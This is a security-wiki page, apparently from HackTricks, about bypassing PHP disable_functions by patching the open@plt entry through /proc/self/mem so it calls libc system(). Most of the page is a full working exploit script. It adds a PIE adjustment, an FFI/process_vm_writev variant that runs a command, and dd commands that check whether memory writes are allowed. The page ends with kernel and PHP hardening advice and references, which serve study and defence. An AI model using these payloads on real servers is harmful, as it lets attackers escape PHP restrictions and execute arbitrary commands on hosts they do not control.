# via mem

{{#include ../../../../banners/hacktricks-training.md}}

From [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)

```php
<?php
/*
1. kernel>=2.68
2）PHP-CGI or PHP-FPM）因为mod_php并没有读取/proc/self/mem
3）代码针对x64编写，要用于x32需要更改
4）Open_basedir=off（或者能绕过open_basedir读写 /lib/ 和/proc/）
*/
/*
$libc_ver:
beched@linuxoid ~ $ php -r 'readfile("/proc/self/maps");' | grep libc
7f3dfa609000-7f3dfa7c4000 r-xp 00000000 08:01 9831386                    /lib/x86_64-linux-gnu/libc-2.19.so
$open_php:
beched@linuxoid ~ $ objdump -R /usr/bin/php | grep '\sopen$'
0000000000e94998 R_X86_64_JUMP_SLOT  open
$system_offset and $open_offset:
beched@linuxoid ~ $ readelf -s /lib/x86_64-linux-gnu/libc-2.19.so | egrep "\s(system|open)@@"
  1337: 0000000000046530    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
  1679: 00000000000ec150    90 FUNC    WEAK   DEFAULT   12 open@@GLIBC_2.2.5
*/
function packlli($value) {
    $higher = ($value & 0xffffffff00000000) >> 32;
    $lower = $value & 0x00000000ffffffff;
    return pack('V2', $lower, $higher);
}
function unp($value) {
    return hexdec(bin2hex(strrev($value)));
}
function parseelf($bin_ver, $rela = false) {
    $bin = file_get_contents($bin_ver);
    $e_shoff = unp(substr($bin, 0x28, 8));
    $e_shentsize = unp(substr($bin, 0x3a, 2));
    $e_shnum = unp(substr($bin, 0x3c, 2));
    $e_shstrndx = unp(substr($bin, 0x3e, 2));
    for($i = 0; $i < $e_shnum; $i += 1) {
        $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
        if($sh_type == 11) { // SHT_DYNSYM
            $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        }
        elseif(!isset($strtab_off) && $sh_type == 3) { // SHT_STRTAB
            $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
        }
        elseif($rela && $sh_type == 4) { // SHT_RELA
            $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
            $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
        }
    }
    if($rela) {
        for($i = $relaplt_off; $i < $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
            $r_offset = unp(substr($bin, $i, 8));
            $r_info = unp(substr($bin, $i + 8, 8)) >> 32;
            $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
            $name = '';
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != "\0") {
                $name .= $bin[$j];
            }
            if($name == 'open') {
                return $r_offset;
            }
        }
    }
    else {
        for($i = $dynsym_off; $i < $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
            $name_off = unp(substr($bin, $i, 4));
            $name = '';
            $j = $strtab_off + $name_off - 1;
            while($bin[++$j] != "\0") {
                $name .= $bin[$j];
            }
            if($name == '__libc_system') {
                $system_offset = unp(substr($bin, $i + 8, 8));
            }
            if($name == '__open') {
                $open_offset = unp(substr($bin, $i + 8, 8));
            }
        }
        return array($system_offset, $open_offset);
    }
}
echo "[*] PHP disable_functions procfs bypass (coded by Beched, RDot.Org)\n";
if(strpos(php_uname('a'), 'x86_64') === false) {
    echo "[-] This exploit is for x64 Linux. Exiting\n";
    exit;
}
if(substr(php_uname('r'), 0, 4) < 2.98) {
    echo "[-] Too old kernel (< 2.98). Might not work\n";
}
echo "[*] Trying to get open@plt offset in PHP binary\n";
$open_php = parseelf('/proc/self/exe', true);
if($open_php == 0) {
    echo "[-] Failed. Exiting\n";
    exit;
}
echo '[+] Offset is 0x' . dechex($open_php) . "\n";
$maps = file_get_contents('/proc/self/maps');
preg_match('#\s+(/.+libc\-.+)#', $maps, $r);
echo "[*] Libc location: $r[1]\n";
echo "[*] Trying to get open and system symbols from Libc\n";
list($system_offset, $open_offset) = parseelf($r[1]);
if($system_offset == 0 or $open_offset == 0) {
    echo "[-] Failed. Exiting\n";
    exit;
}
echo "[+] Got them. Seeking for address in memory\n";
$mem = fopen('/proc/self/mem', 'rb');
fseek($mem, $open_php);
$open_addr = unp(fread($mem, 8));
echo '[*] open@plt addr: 0x' . dechex($open_addr) . "\n";
$libc_start = $open_addr - $open_offset;
$system_addr = $libc_start + $system_offset;
echo '[*] system@plt addr: 0x' . dechex($system_addr) . "\n";
echo "[*] Rewriting open@plt address\n";
$mem = fopen('/proc/self/mem', 'wb');
fseek($mem, $open_php);
if(fwrite($mem, packlli($system_addr))) {
    echo "[+] Address written. Executing cmd\n";
    readfile('/usr/bin/id');
    exit;
}
echo "[-] Write failed. Exiting\n";
```

---

## 2024-2025 status: Linux kernel hardening against `/proc/[pid]/mem`

Starting with the Linux **6.11** cycle (July 2024) a new Kconfig option
`SECURITY_PROC_MEM_RESTRICT_WRITES` was merged.  When distributions enable it
(or system administrators pass the corresponding kernel command-line/sysctl
flags such as `proc_mem.restrict_write=all`) an *unprivileged* process can **no
longer open or write to its own `/proc/self/mem` file descriptor unless it is an
active ptracer**.  In other words, the memory-patching trick used by the PoC
above will simply fail with `EPERM` even though you are patching *your own*
process.  Fedora 41 (rawhide), Ubuntu 24.10 and Debian trixie already ship test
kernels with the restriction enabled by default.

Quick test to find out if the write is still allowed:

```bash
$ dd if=/proc/self/mem of=/dev/null bs=1 count=4 2>/dev/null && echo "read OK" || echo "read blocked"
$ printf '\x90' | dd of=/proc/self/mem seek=$(printf '%d' 0x$(grep " r-xp .* /proc/self/exe" /proc/self/maps | head -n1 | cut -d'-' -f1)) conv=notrunc 2>&1 || echo "write blocked"
```

If the second command returns `Operation not permitted`, the kernel is
protected and this bypass path is closed.  On older kernels or systems that
still allow the write, the original exploit continues to work.

---

## PIE & ASLR considerations (PHP 8.x)

Most modern Linux distributions compile the `php` binary with *PIE* enabled,
meaning the ELF text segment is loaded at a random base address each run.
While the script already parses `/proc/self/maps` to resolve the *runtime*
address of `libc`, you also need to treat `/proc/self/exe` as a *position
independent* PIE binary.  The easiest way to do this is to add the mapping base
reported for the executable when you calculate `$open_php`, e.g.:

```php
$exe_base = hexdec(substr(exec('grep " /proc/self/exe" /proc/self/maps | cut -d"-" -f1'), 0, 12));
$open_php += $exe_base; // adjust offset for PIE
```

Without this adjustment the script will patch the wrong virtual address and
crash on recent distros.

---

## Alternative approach: `process_vm_writev` + FFI (read-only `/proc/self/mem`)

When `/proc/self/mem` writes are blocked but **`process_vm_writev`** system call
remains unrestricted, you can still achieve in-memory patching from within a
PHP process by combining the [FFI](https://www.php.net/manual/en/book.ffi.php)
extension (enabled by default since PHP 7.4) with the syscall:

```php
<?php
if (!extension_loaded('FFI')) die('FFI disabled');
$ffi = FFI::cdef("ssize_t process_vm_writev(pid_t, const struct iovec *, unsigned long, const struct iovec *, unsigned long, unsigned long);");

/* locate open@plt the same way as before … */
$remote_iov = FFI::new("struct iovec[1]");
$local_iov  = FFI::new("struct iovec[1]");
$patch      = pack('Q', $system_addr);
$local_iov[0]->iov_base = FFI::new("char[8]", false);
FFI::memcpy($local_iov[0]->iov_base, $patch, 8);
$local_iov[0]->iov_len  = 8;
$remote_iov[0]->iov_base = $open_addr;
$remote_iov[0]->iov_len  = 8;

$bytes = $ffi->process_vm_writev(getmypid(), $local_iov, 1, $remote_iov, 1, 0);
if($bytes == 8) {
    echo "[+] Patched via process_vm_writev\n";
    system('/usr/bin/id');
}
?>
```

`process_vm_writev` respects page protections, so you may need to ensure the
`.plt` page is mapped `rw` first (for example with `mprotect` via FFI).  The
advantage is that it does **not** rely on `/proc/self/mem` and continues to
work on kernels with the new restriction, provided seccomp/AppArmor does not
block the syscall.

---

## Defenses & hardening checklist

* Enable `SECURITY_PROC_MEM_RESTRICT_WRITES` (Linux ≥ 6.11) or set the runtime
  sysctls `proc_mem.restrict_open_write=all`, `proc_mem.restrict_write=all`.
* Set `kernel.yama.ptrace_scope=2` to forbid ptrace from non-root processes.
* Compile PHP with `–disable-ffi`, or set `ffi.enable=false` in `php.ini` if
  you do not require the feature.
* Use **open_basedir**+**chroot** so that `/proc/` is not reachable from the
  PHP interpreter at all (remember that *any* readable path to the procfs can
  be abused).
* Employ seccomp or AppArmor profiles that deny `process_vm_writev`,
  `ptrace`, `mprotect(PROT_WRITE|PROT_EXEC)` and similar memory-modifying
  syscalls for the PHP worker UID.

---

## References

* Linux 6.11 procfs hardening announcement, Phoronix (July 14 2024)  
  https://www.phoronix.com/news/Linux-6.11-Tightens-Mem-Access
* "May the FOLL_FORCE not be with you" – LWN.net deep-dive into `/proc/pid/mem` security (July 19 2024)  
  https://lwn.net/Articles/983169/

{{#include ../../../../banners/hacktricks-training.md}}



